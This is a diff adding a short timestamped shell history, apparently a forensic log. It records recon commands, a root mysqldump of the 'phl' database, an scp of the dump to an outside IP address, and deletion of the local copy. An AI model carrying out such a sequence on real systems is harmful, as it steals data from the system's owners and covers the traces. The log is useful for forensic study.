@@ -1,0 +1,11 @@
+19/02/22 22:00:27 netstat -atunp
+19/02/22 22:00:48 sudo -l
+19/02/22 22:00:55 sudo mysql -u root -p
+19/02/22 22:01:45 sudo mysqldump -u root -p phl > phl.db
+19/02/22 22:01:49 file phl.db
+19/02/22 22:01:59 head -50 phl.db
+19/02/22 22:02:17 ls
+19/02/22 22:02:26 scp phl.db fierce@178.62.228.28:/tmp/phl.db
+19/02/22 22:02:36 rm phl.db
+19/02/22 22:02:38 exit
+
